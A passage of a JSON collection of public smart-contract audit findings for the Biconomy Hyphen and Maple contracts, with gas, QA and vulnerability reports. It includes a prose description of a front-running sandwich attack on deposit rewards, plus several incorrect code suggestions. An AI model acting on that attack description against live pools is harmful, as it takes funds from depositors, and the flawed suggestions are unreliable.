LiquidityProviders.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L273\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L325\n\nIERC20Upgradeable(_token).safeTransferFrom(_msgSender(), address(liquidityPool), _amount);\n\n\nIERC20Upgradeable(token).safeTransferFrom(_msgSender(), address(liquidityPool), _amount);\n\n\n8 delete unused import statement.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L6\n\n9 visibility must be external. increaseCurrentLiquidity and decreaseCurrentLiquidity of LiquidityProvider.sol can be called only by LiquidityPool contract, so visibility must be external instead of public.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L127\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L131\n\nfunction increaseCurrentLiquidity(address tokenAddress, uint256 amount) external onlyLiquidityPool {\n\nfunction decreaseCurrentLiquidity(address tokenAddress, uint256 amount) external onlyLiquidityPool {\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-biconomy-findings",
      "repo": "https://github.com/code-423n4/2022-03-biconomy-findings",
      "url": "https://github.com/code-423n4/2022-03-biconomy-findings/issues/189"
    }
  },
  {
    "title": " Possible frontrun on deposits on LiquidityPool",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L255\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L175-L188\n\n\n# Vulnerability details\n\n## Impact\nRewards are given to a user for depositing either ERC20 tokens or their native token into the LiquidityPool. This reward is used to incentivize users to deposit funds into the liquidity pool when the pool is not in an equilibrium state.\n\nFor regular users, this liquidity pool state fluctuates based on the frequency and amount of deposits made to the liquidity pool. If a malicious user can control the state of the liquidity pool before a victim deposits tokens into the liquidity pool, they can gain double rewards.\n\nTo gain these double rewards, a malicious user can watch the mempool for transactions that will receive a reward when the deposit occurs. When a malicious user sees that victim deposit, the malicious user can attach a higher fee to their transaction and initiate a deposit. This will allow the malicious user's transaction to front-run before the victim's transaction.\n\nOnce the malicious user's deposit is complete, the liquidity pool state will be in a near equilibrium state. Then, the victim's deposit will occur which causes the liquidity pool state to no longer be in equilibrium.\n\nFinally, the malicious user will make a final deposit gaining yet another reward for bringing the liquidity pool state back to equilibrium.\n\nTo sum up, a malicious user can create a sandwich attack where they deposit their own tokens before and after a victim's transaction. This will allow the malicious user to double dip and gain rewards twice due to victim's deposit.\n\n## Proof of Concept\nLet's look at the depositNative function which is the simpler of the two deposit functions.\n\nThe key component in the depositNative function is the getRewardAmount which can be found here (https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L255) . The getRewardAmount calculates how much available vs supplied liquidity exists in the liquidity pool. There are no (https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L175-L188) time-weighted checks to calculate the available vs. supplied liquidity. With a lack of checks for time-weight and that there are no frontrun checks against deposits, it's trivial to front-run deposits and control the liquidity of the liquidity such that the reward amount can be double-dipped.\n\n## Tools Used\nText editor\n\n## Recommended Mitigation Steps\n\n   1. By allowing each deposit to manipulate the liquidity pool state from either a deficient or excessive state, malicious users can double dip on rewards.\n  2.  Alternative approaches to calculating rewards is possible, for example a dutch auction style deposit system where rewards are distributed evenly could reduce an impact of a frontrun attack.\n 3.   A simpler approach is to record liquidity states at specific block timestamps and check against the timestamp for the current block state.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-biconomy-findings",
      "repo": "https://github.com/code-423n4/2022-03-biconomy-findings",
      "url": "https://github.com/code-423n4/2022-03-biconomy-findings/issues/180"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# 1. Remove unnecessary import\n\n## Impact\n\nThe IERC20Upgradeable.sol is imported twice in LiquidityPool.sol, once from the SafeERC20Upgradeable.sol import and once from the direct import of IERC20Upgradeable.sol. The direct import line can be removed.\n\n## Proof of Concept\n\nIERC20Upgradeable.sol is imported [indirectly on line 9](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L9) and imported [directly on line 10 of LiquidityPool.sol](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L10).\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nRemove the following line from LiquidityPool.sol:\n```\nimport   \"@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol\";\n```\n\n# 2. Add unchecked\n\n## Impact\n\nWhen an overflow or underflow is not possible, unchecked can be used to save the gas consumed by SafeMath in Solidity 0.8.0+\n\n## Proof of Concept\n\nLiquidityPool.sol [contains this code](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L178-L179):\n```\nif (currentLiquidity < providedLiquidity) {\n uint256 liquidityDifference = providedLiquidity - currentLiquidity;\n```\n\nBecause `providedLiquidity - currentLiquidity` cannot underflow, unchecked can be used\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReplace the line of code copied above with the following\n```\nif (currentLiquidity < providedLiquidity) {\n  unchecked { uint256 liquidityDifference = providedLiquidity - currentLiquidity; }\n```\n\n# 3. Skip setting default int value\n\n## Impact\n\nWhen an overflow or underflow is not possible, unchecked can be used to save the gas consumed by SafeMath in Solidity 0.8.0+\n\n## Proof of Concept\n\nLiquidityPool.sol [contains this code](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L178-L179):\n```\nif (currentLiquidity < providedLiquidity) {\n uint256 liquidityDifference = providedLiquidity - currentLiquidity;\n```\n\nBecause `providedLiquidity - currentLiquidity` cannot underflow, unchecked can be used\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReplace the line of code copied above with the following\n```\nif (currentLiquidity < providedLiquidity) {\n  unchecked { uint256 liquidityDifference = providedLiquidity - currentLiquidity; }\n```\n\n# 4. Revert string > 32 bytes\n\n## Impact\n\nStrings are broken into 32 byte chunks for operations. Revert error strings over 32 bytes therefore consume extra gas as [documented publicly](https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#c17b)\n\n## Proof of Concept\n\nThe locations where a default int value is set are listed below.\n1. [LPToken.sol Line 70](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/token/LPToken.sol#L70)\n2. [LPToken.sol Line 77](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L77)\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReducing revert error strings to under 32 bytes decreases deployment time gas and runtime gas when the revert condition is met. Alternatively, the code could be modified to use custom errors, introduced in Solidity 0.8.4: https://blog.soliditylang.org/2021/04/21/custom-errors/\n\n# 5. Public functions can be external\n\n## Impact\n\nMany functions can be declared external for gas savings\n\n## Proof of Concept\n\nThe functions that can benefit from this gas optimization and their corresponding contract are listed below.\n\nExecutorManager.sol\n- getExecutorStatus\n- getAllExecutors\n\nLiquidityFarming.sol\n- initialize\n- setRewardPerSecond\n- getNftIdsStaked\n- getRewardRatePerSecond\n\nLiquidityPool.sol\n- initialize\n- setTrustedForwarder\n- setLiquidityProviders\n- getExecutorManager\n\nLiquidityProviders.sol\n- initialize\n- getTotalReserveByToken\n- getSuppliedLiquidityByToken\n- getTotalLPFeeByToken\n- getCurrentLiquidity\n- increaseCurrentLiquidity\n- decreaseCurrentLiquidity\n- getFeeAccumulatedOnNft\n\nWhitelistPeriodManager.sol\n- initialize\n\nLPToken.sol\n- initialize\n- setSvgHelper\n- getAllNftIdsByUser\n- exists\n\nTokenManager.sol\n- getEquilibriumFee\n- getMaxFee\n- getTokensInfo\n- getDepositConfig\n- getTransferConfig\n\n## Tools Used\n\nSlither\n\n## Recommended Mitigation Steps\n\nDeclare functions as external instead of public when possible for gas savings\n\n# 6. Unnecessary uint zero initialization\n\n## Impact\n\nuint256 variables are initialized to a default value of zero per Solidity docs:\nhttps://docs.soliditylang.org/en/latest/control-structures.html#default-value \n\nSetting a variable to the default value is unnecessary. Shortening or removing lines of code where variables are initialized to zero can save gas. Here are a few articles describing this gas optimization:\nhttps://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#53bd \nhttps://medium.com/coinmonks/gas-optimization-in-solidity-part-i-variables-9d5775e43dde#4135 \n\n## Proof of Concept\n\nThe locations where a default int value is set are listed below.\n1. [Line 266 of LiquidityFarming.sol](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityFarming.sol#L266)\n2. [Line 247 of WhitelistPeriodManager.sol](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/WhitelistPeriodManager.sol#L247)\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nInstead of initializing a variable to zero, such as `uint256 abc = 0;`, the line can be shortened to `uint256 abc;` as Solidity automatically initializes uint variables to zero.",
    "dataSource": {
      "name": "code-423n4/2022-03-biconomy-findings",
      "repo": "https://github.com/code-423n4/2022-03-biconomy-findings",
      "url": "https://github.com/code-423n4/2022-03-biconomy-findings/issues/173"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Gas Optimization\n\n\n#1 Removing && operator can saving more gas \n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L156-L160\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L75\n\nPOC it can be seen from my report here :\n\nhttps://github.com/code-423n4/2022-01-timeswap-findings/issues/89\n\ninstead of using operator && on single require check. using additional require check can save more gas.\n\nRecommended Mitigation Steps:\n\nex.\n\n```\nrequire(tokenManager.getDepositConfig(toChainId, tokenAddress).min <= amount, \"Deposit amount not in Cap limit\");\nrequire(tokenManager.getDepositConfig(toChainId, tokenAddress).max >= amount, \"Deposit amount not in Cap limit\");\n```\n\n\n#2 better increment for saving more gas\n\nPrefix increment are cheaper than postfix increment, its a common that using ++i instead i++ for compiler ^0.8.* .So \nthis f() are not using prefix increments (++i) or using the unchecked (++i). \t\n\nit can be seen from here : https://github.com/code-423n4/2022-01-xdefi-findings/issues/9 and \n\nOccurance :\n```\nblob/main/ontracts/hyphen/ExecutorManager.sol \t\t\t\t#L31, #L47\n```\n\n#3 Upgrade pragma at least 0.8.4\n\nPoC it can be seen from here : \n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L75\n\nUsing newer compiler version and the optimizer will gives gas optimization\n\nOccurance :\n\n```\nExecutorManager.sol\nLiquidityFarming.sol\nLiquidityPool.sol\nLiquidityProviders.sol\nWhitelistPeriodManager.sol\nLPToken.sol\nTokenManager.sol\n```\n\n#4 set variable as immutable\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L26-L27\nthe `lpToken` & `liquidityProviders` can set as `immutable` because the value is just set once in the `initialize()` function\n\nRecommended Mitigation Steps:\n\n```\n    ILPToken public lpToken;\n    ILiquidityProviders public liquidityProviders;\n```\n\nchange to\n\n```\n    ILPToken public immutable lpToken;\n    ILiquidityProviders public immutable liquidityProviders;\n```\nBiohypengas.txt\n3 KB\n\n#5 unnecessary `i` value set\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/ExecutorManager.sol#L31\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/ExecutorManager.sol#L47\nfor uint = 0, just declare it without set the value\n\n#6 `totalGasUsed` value was set multiple times\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L330-L332\ninstead of setting the value multiple times, do all the operations once before setting the value can save gas:\n```\nuint256 totalGasUsed = initialGas - gasleft() \n+ tokenManager.getTokensInfo(tokenAddress).transferOverhead + baseGas;\n```\n#7 function visibility can set external instead of public\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/ExecutorManager.sol#L21-L25\n`getExecutorStatus()` and `getAllExecutor()` weren't called inide the contract. set the visibilty to `external`\n\n#8 using `changeFee()` parameter value to emit `feeChanged` event\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L53\ninstead of reading from storage to return `tokensInfo[tokenAddress].vars` value, using `_equilibriumFee` and `_maxFee`\ncan save gas:\n```\nemit FeeChanged(tokenAddress, _equilibriumFee, _maxFee);\n```\n\n#9 using `calldata` to store parameter\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L70-L72\nusing calldata to store array as a parameter can save gas\n\n#10 Unnecessary function\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L126-L133\nThe `depositConfig` mapping was already set public. Anyone can just get the return exactly the same way without running `getDepositConfig()`\ni recommend remove the `getDepositConfig` function (and also `getTransferConfig()`)\n\n#11 Unnecessary `currentLiquidity` var declaration\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L343\ngetCurrentLiquidity(tokenAddress) value can just passed to `resultingLiquidity` at L 346\n```\nuint256 resultingLiquidity = getCurrentLiquidity(tokenAddress) - amount;\n```\n\n#12 using ++var for increment + 1\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/LPToken.sol#L84\nby changing the code to:\n```\nuint256 tokenId = ++totalSupply();\n```\ncan save gas\n\n#13 Simple way to get `_sendErc20AndGetSentAmount()` return value\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L109-L117\nthe value of  `_token.balanceOf(_to) - recepientBalance;` == `_amount`. Therefore, the function can be simplified:\n```\n    function _sendErc20AndGetSentAmount(\n        IERC20Upgradeable _token,\n        uint256 _amount,\n        address _to\n    ) private returns (uint256) {\n        _token.safeTransfer(_to, _amount);\n        return _amount,\n    }\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-biconomy-findings",
      "repo": "https://github.com/code-423n4/2022-03-biconomy-findings",
      "url": "https://github.com/code-423n4/2022-03-biconomy-findings/issues/170"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Non-Critical Findings\n\n### Rename contract `LiquidityProviders` to `LiquidityProvider`\n\n#### Description\n\nIt's confusing to use the plural for this contract name. Consider renaming the contract (and interface) to `LiquidityProvider` (singular).\n\n### Redundant type cast to `payable`\n\n#### Description\n\nFunction argument `_to` is defined as `address payable`, the type casting to `payable` on [L187](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L187) is redundant.\n\n#### Findings\n\n[LiquidityFarming.sol#L187](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L187)\n\n```solidity\nfunction reclaimTokens(\n  address _token,\n  uint256 _amount,\n  address payable _to\n) external nonReentrant onlyOwner {\n  require(_to != address(0), \"ERR__TO_IS_ZERO\");\n  if (_token == NATIVE) {\n    (bool success, ) = payable(_to).call{ value: _amount }(\"\"); // @audit-info redundant type cast to `payable()`\n    require(success, \"ERR__NATIVE_TRANSFER_FAILED\");\n  } else {\n    IERC20Upgradeable(_token).safeTransfer(_to, _amount);\n  }\n}\n\n```\n\n#### Recommended mitigation steps\n\nRemove redundant type cast:\n\n```solidity\nfunction reclaimTokens(\n  address _token,\n  uint256 _amount,\n  address payable _to\n) external nonReentrant onlyOwner {\n  require(_to != address(0), \"ERR__TO_IS_ZERO\");\n  if (_token == NATIVE) {\n    (bool success, ) = _to.call{ value: _amount }(\"\"); // @audit-info removed redundant type cast to `payable()`\n    require(success, \"ERR__NATIVE_TRANSFER_FAILED\");\n  } else {\n    IERC20Upgradeable(_token).safeTransfer(_to, _amount);\n  }\n}\n\n```\n\n### `10**18` can be changed to `1e18`\n\n#### Description\n\nFor better readability, change `10**18` to `1e18`.\n\n#### Findings\n\n[LiquidityProviders.sol#L27](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L27)\n\n### Use scientific notation `1e10` instead of 10000000000\n\n#### Description\n\nFor better readability and to prevent any issues, use the scientific notation `1e10` instead of 10000000000\n\n#### Findings\n\n[LiquidityPool.sol#L20](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L20)\n\n### Reuse `BASE_DIVISOR` in `LiquidityPool.getRewardAmount()`\n\n#### Description\n\nUsing large numbers with many zeros (e.g. 10000000000) can cause issues when accidentally having inconsistent number of zeros. I recommend to use the constant variable `BASE_DIVISOR` instead.\n\n```solidity\nfunction getRewardAmount(uint256 amount, address tokenAddress) public view returns (uint256 rewardAmount) {\n  uint256 currentLiquidity = getCurrentLiquidity(tokenAddress);\n  uint256 providedLiquidity = liquidityProviders.getSuppliedLiquidityByToken(tokenAddress);\n  if (currentLiquidity < providedLiquidity) {\n    uint256 liquidityDifference = providedLiquidity - currentLiquidity;\n    if (amount >= liquidityDifference) {\n      rewardAmount = incentivePool[tokenAddress];\n    } else {\n      // Multiply by BASE_DIVISOR to avoid 0 reward amount for small amount and liquidity difference\n      rewardAmount = (amount * incentivePool[tokenAddress] * BASE_DIVISOR) / liquidityDifference;\n      rewardAmount = rewardAmount / BASE_DIVISOR;\n    }\n  }\n}\n\n```\n\n#### Findings\n\n[LiquidityPool.sol#L184](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L184)  \n[LiquidityPool.sol#L185](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L185)  \n\n### Spelling mistakes\n\n#### Description\n\nMultiple spelling mistakes across contracts. Both in code (variables, functions,..) as well as in documentation.\n\n#### Findings\n\n**[hyphen/token/TokenManager.sol](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol)**\n\n[L66](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L66): `chainid` -> `chainId`\n\n**[hyphen/LiquidityProviders.sol](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol)**\n\n[L75](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L75): `initalizes` -> `initializes`  \n[L357](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L357): `Claculate` -> `Calculate`  \n\n**[hyphen/LiquidityFarming.sol](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol)**\n\n[L64](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L64): `Updation` -> `Update`  \n[L96](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L96): `initalizeRewardPool` -> `initializeRewardPool`  \n[L114](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L114): `recepientBalance` -> `recipientBalance`  \n[L178](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L178): `reightful` -> `rightful`  \n[L264](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L264): `comitted` -> `committed`  \n\n**[hyphen/WhitelistPeriodManager.sol](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol)**\n\n[L81](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L81) `liqudity`-> `liquidity`  \n[L102](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L102) `liqudity`-> `liquidity`  \n[L113](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L113) `liqudity`-> `liquidity`  \n[L128](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L128) `liqudity`-> `liquidity`  \n[L226](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L226) `ERR__LENGTH_MISMACH` -> `ERR__LENGTH_MISSMATCH`  \n[L246](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L246) `getMaxCommunityLpPositon` -> `getMaxCommunityLpPosition` (Function name! Also correct spelling in interface)  \n\n**[hyphen/LiquidityPool.sol](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol)**\n\n[L145](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L145) `transfered` -> `transferred`  \n[L275](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L275) `amnt` -> `amount`  \n[L300](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L300) `afetr` -> `after`  \n\n## Low Risk\n\n### Prevent minting multiple NFTs per owner per LP\n\n#### Description\n\nIn the README ([see here](https://github.com/code-423n4/2022-03-biconomy#lp-token)) it states that if someone wants to increase the liquidity of an existing position, `increaseLiquidity()` should be called.\n\n#### Recommended mitigation steps\n\nI would advise to prevent adding liquidity via `_addLiquidity()` when there's already an existing position. Add a `require()` to check if there's already an existing position.\n\n#### Findings\n\n[LiquidityProviders.sol#L238](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L238)\n\n```solidity\nfunction _addLiquidity(address _token, uint256 _amount) internal {\n  require(_amount > 0, \"ERR__AMOUNT_IS_0\");\n  require(lpToken.balanceOf(_msgSender()) == 0, \"ERR_LIQUIDITY_ALREADY_ADDED\"); // @audit-info Check if there's an existing LP position and prevent minting multiple NFTs for same owner per LP\n  uint256 nftId = lpToken.mint(_msgSender());\n  LpTokenMetadata memory data = LpTokenMetadata(_token, 0, 0);\n  lpToken.updateTokenMetadata(nftId, data);\n  _increaseLiquidity(nftId, _amount);\n}\n\n```\n\n### Unbound iteration over LP positions\n\n#### Description\n\nThe [WhitelistPeriodManager.getMaxCommunityLpPositon()](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L245) function iterates over all LP tokens. As the amount of tokens is unbound and grows by each newly added LP position, it consumes more and more gas und possibly runs out of gas.\n\nAs this function is not called in critical situations, I consider this finding as rather low risk.\n\n#### Recommended mitigation steps\n\nI recommend to perform the calculation off-chain due to unbound `for` loop which can greatly increase in size.\n\n#### Findings\n\n[WhitelistPeriodManager.sol#L245](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L245)\n",
    "dataSource": {
      "name": "code-423n4/2022-03-biconomy-findings",
      "repo": "https://github.com/code-423n4/2022-03-biconomy-findings",
      "url": "https://github.com/code-423n4/2022-03-biconomy-findings/issues/167"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nMaple protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/maple-labs/revenue-distribution-token/blob/main/contracts/RevenueDistributionToken.sol#L162\n\nhttps://github.com/maple-labs/mpl-migration/blob/main/contracts/Migrator.sol#L26\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n# C4-002 : The Contract Should Approve(0) first\n\n## Impact -  LOW\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).approve(address(operator), 0);\nIERC20(token).approve(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\n```\nhttps://github.com/maple-labs/xMPL/blob/main/contracts/xMPL.sol#L63\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount.\n\n\n# C4-003 : Use of Block.timestamp\n\n## Impact -  Non-Critical\n\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/maple-labs/revenue-distribution-token/blob/main/contracts/RevenueDistributionToken.sol#L90\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n# C4-004 :  Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\n## Impact -  LOW\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n```\nhttps://github.com/maple-labs/revenue-distribution-token/blob/main/contracts/RevenueDistributionToken.sol#L162\n\nhttps://github.com/maple-labs/revenue-distribution-token/blob/main/contracts/RevenueDistributionToken.sol#L181\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.\n\n\n# C4-005 :  Consider making contracts Pausable\n\n## Impact -  LOW\n\nThere are many external risks so my suggestion is that you should consider making the contracts pausable, so in case of an unexpected event, the admin can pause transfers.\n\n```\n\nhttps://github.com/maple-labs/revenue-distribution-token/blob/main/contracts/RevenueDistributionToken.sol#L99\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider making contracts Pausable https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol.\n\n\n# C4-006 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical change should be completed with the two step. For instance, migrate function can be implemented with the two step procedure. (accept migrating)\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/maple-labs/mpl-migration/blob/main/contracts/Migrator.sol#L20\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n\n# C4-007 : # USE SAFEERC20.SAFEAPPROVE INSTEAD OF APPROVE\n\n## Impact - LOW\n\nNote that approve() will fail for certain token implementations that do not return a boolean value (). Hence it is recommend to use safeApprove().\n\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/maple-labs/xMPL/blob/main/contracts/xMPL.sol#L63\"\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nUpdate to _token.safeApprove(spender, type(uint256).max) in the function.\n\n# C4-008 : #  Missing zero-address checks in constructor\n\n## Impact - LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are constructed incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/maple-labs/revenue-distribution-token/blob/main/contracts/RevenueDistributionToken.sol#L48\n\nhttps://github.com/maple-labs/xMPL/blob/main/contracts/xMPL.sol#L28\n\nhttps://github.com/maple-labs/mpl-migration/blob/main/contracts/Migrator.sol#L13\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n# C4-009 : # DOMAIN_SEPARATOR can change\n\n## Impact - LOW\n\nThe variable DOMAIN_SEPARATOR in contract ERC20Permit is assigned in the constructor and will not change after being initialized. However, if a hard fork happens after the contract deployment, the domain would become invalid on one of the forked chains due to the block.chainid has changed.\n\n## Proof of Concept\n\n1. Navigate to the following 